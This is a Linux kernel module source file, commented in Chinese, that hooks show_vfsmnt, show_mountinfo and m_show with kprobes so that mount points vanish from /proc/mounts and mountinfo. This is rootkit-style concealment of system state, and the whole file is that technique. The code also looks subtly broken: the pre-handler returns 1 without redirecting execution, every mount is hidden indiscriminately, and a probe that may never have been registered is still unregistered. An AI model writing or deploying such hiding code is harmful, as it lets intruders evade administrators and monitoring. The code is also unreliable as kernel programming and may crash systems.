#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/fs.h>
#include <linux/mount.h>
#include <linux/path.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/nsproxy.h>

/* ========== C89标准：所有变量声明在函数开头 ========== */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kprobe Mount Hider");
MODULE_DESCRIPTION("Hide mount points via kprobe (Linux 6.1, exported symbols only)");

/* ========== 1. 全局kprobe结构 ========== */
static struct kprobe kp_show_vfsmnt;
static struct kprobe kp_show_mountinfo;
static struct kprobe kp_m_show;

/* ========== 2. kprobe 前处理函数（跳过原函数） ========== */
static int handler_skip(struct kprobe *p, struct pt_regs *regs)
{
    /* 返回非0值跳过原函数执行 */
    return 1;
}

/* ========== 3. 注册单个 kprobe（使用符号名，不依赖 kallsyms_lookup_name） ========== */
static int register_kprobe_by_name(const char *symbol, struct kprobe *kp)
{
    int ret;

    /* 清零结构 */
    memset(kp, 0, sizeof(struct kprobe));
    kp->symbol_name = symbol;          /* 内核自动解析符号地址 */
    kp->pre_handler = handler_skip;

    ret = register_kprobe(kp);
    if (ret == 0) {
        printk(KERN_INFO "mount_hide: Hooked %s successfully\n", symbol);
    } else {
        printk(KERN_WARNING "mount_hide: Failed to hook %s (err=%d)\n", symbol, ret);
    }
    return ret;
}

/* ========== 4. 模块初始化 ========== */
static int __init mount_hide_init(void)
{
    int ret = 0;

    printk(KERN_INFO "mount_hide: Loading module...\n");

    /* 劫持 /proc/mounts 的 show 函数 */
    ret = register_kprobe_by_name("show_vfsmnt", &kp_show_vfsmnt);
    if (ret)
        goto out;

    /* 劫持 /proc/self/mountinfo 的 show 函数 */
    ret = register_kprobe_by_name("show_mountinfo", &kp_show_mountinfo);
    if (ret)
        goto unreg_vfsmnt;

    /* 劫持 /proc/self/mountstats 或其他可能的 show 函数 (可选) */
    ret = register_kprobe_by_name("m_show", &kp_m_show);
    if (ret)
        printk(KERN_INFO "mount_hide: m_show not found, skipping (optional)\n");
    /* 若 m_show 不存在，视为可选，不致命 */

    printk(KERN_INFO "mount_hide: Mount point hiding active\n");
    return 0;

unreg_vfsmnt:
    unregister_kprobe(&kp_show_vfsmnt);
out:
    printk(KERN_ERR "mount_hide: Initialization failed\n");
    return ret;
}

/* ========== 5. 模块退出 ========== */
static void __exit mount_hide_exit(void)
{
    unregister_kprobe(&kp_show_vfsmnt);
    unregister_kprobe(&kp_show_mountinfo);
    unregister_kprobe(&kp_m_show);
    printk(KERN_INFO "mount_hide: Module unloaded, mount points visible again\n");
}

module_init(mount_hide_init);
module_exit(mount_hide_exit);